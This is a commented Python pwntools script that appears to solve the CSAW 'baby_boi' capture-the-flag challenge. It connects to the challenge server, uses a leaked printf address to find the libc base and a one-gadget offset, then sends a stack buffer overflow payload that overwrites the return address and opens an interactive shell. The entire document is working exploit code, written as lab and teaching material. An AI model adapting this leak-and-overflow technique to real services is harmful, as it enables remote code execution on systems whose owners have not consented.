# Import pwn-tools
from pwn import *
from time import sleep

# Connect to the remote host
sh = remote("pwn.chal.csaw.io", 1005) # for the remote process
# sh = process("./baby_boi") # for the local process (debugging)
# gdb.attach(sh, "break *0x00400728")
# sleep(1)

# binary for libc so you can calculate offsets for important functions
e = ELF('libc-2.27.so')

# Size of locals in order to overwrite for ROP
locals_size = 32
word_size = 8

# Receive output
hello = sh.recvline()
address = int(sh.recvline().split(": ")[1], 16)

# calculate address for popping a shell
target_offset = 0x0004f322 # from ghidra
printf_offset = e.symbols['printf']
libc_base = address - printf_offset
target_addr = libc_base + target_offset

locals_filler = "A" * locals_size
ebp_filler = "A" * word_size
# payload = "A" * word_size # used for just testing the vulnerability
payload = p64(target_addr)

attack_string = locals_filler + ebp_filler + payload

sh.sendline(attack_string)

# In order to use the shell
sh.interactive()
